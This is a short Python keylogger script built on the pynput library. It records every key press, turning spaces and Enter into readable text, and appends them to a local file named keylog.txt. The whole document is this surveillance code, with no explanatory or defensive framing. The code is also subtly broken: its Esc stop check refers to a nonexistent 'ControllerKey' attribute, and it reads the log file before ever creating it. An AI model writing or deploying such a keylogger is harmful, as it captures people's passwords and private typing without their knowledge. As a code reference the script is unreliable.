from pynput import keyboard

def get_info(key):
    with open('keylog.txt', 'r') as fil:
        words = fil.read()
    with open('keylog.txt', 'w') as fil:
        fil.write(words + key)

def logger(key):
    if key == keyboard.Key.space:
        x = ' '

    elif key == keyboard.Key.enter:
        x = '\n\n'
        
    else:
        x = (str(key))
        
    get_info(x)

def release(key):
    if key == keyboard.ControllerKey.esc:
        # Stop listener
        return False
    
with keyboard.Listener(on_press=logger, on_release=release) as ls:
    ls.join()